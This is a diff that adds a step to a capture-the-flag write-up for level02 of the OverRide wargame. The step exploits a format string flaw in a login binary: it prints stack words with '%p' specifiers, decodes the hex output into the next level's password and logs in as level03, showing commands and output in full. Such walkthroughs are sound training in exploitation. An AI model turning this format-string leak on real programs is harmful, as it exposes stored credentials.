@@ -41,6 +41,30 @@ Finally ```strncmp()``` compares the password input by user with the correct pas
 
 The key vulnerability is the username provided is then printed with ```printf()```. So we can use the format string attack to print what is on the stack, where the password is stored.
 
+With the format string attack, looking through arguments in the stack we find what looks like a password at arguments 22-26.
+```
+level02@OverRide:~$ (python -c 'print("%26$p%25$p%24$p%23$p%22$p")'; python -c 'print("password")'; cat) | ~/level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: --[ Password: *****************************************
+0x48336750664b394d0x354a35686e4758730x377a7143574e67580x45414a35617339510x756e505234376848 does not have access!
+```
+
+Converted to ASCII, and reversed to revert endian, we find our password.
+```
+level02@OverRide:~$ echo 0x48336750664b394d0x354a35686e4758730x377a7143574e67580x45414a35617339510x756e505234376848 | xxd -r -p | rev
+Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+```
+
+Let's log in to confirm this is the correct password.
+```
+level02@OverRide:~$ su level03
+Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+...
+level03@OverRide:~$
+```
 
 ## Recreate Exploited Binary
 
